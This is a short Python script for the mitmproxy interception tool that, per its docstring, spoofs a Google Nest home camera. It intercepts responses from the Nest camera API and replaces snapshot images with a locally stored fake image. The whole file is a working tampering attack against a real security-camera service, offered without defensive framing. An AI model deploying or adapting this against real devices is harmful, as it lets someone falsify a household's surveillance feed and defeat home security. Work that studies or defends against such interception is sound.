"""
This script spoofs the google home camera
"""
from mitmproxy import http, ctx
import json

def response(flow: http.HTTPFlow) -> None:

    if "nexusapi-gl1.camera.home.nest.com" in flow.request.pretty_host:
        if 'snapshot' in flow.request.url:
              spoof =  open('images/nest-spoof.jpg','rb').read()
              flow.response.content=spoof
              ctx.log.alert("[Google Home] <Spoofed Camera Image>")
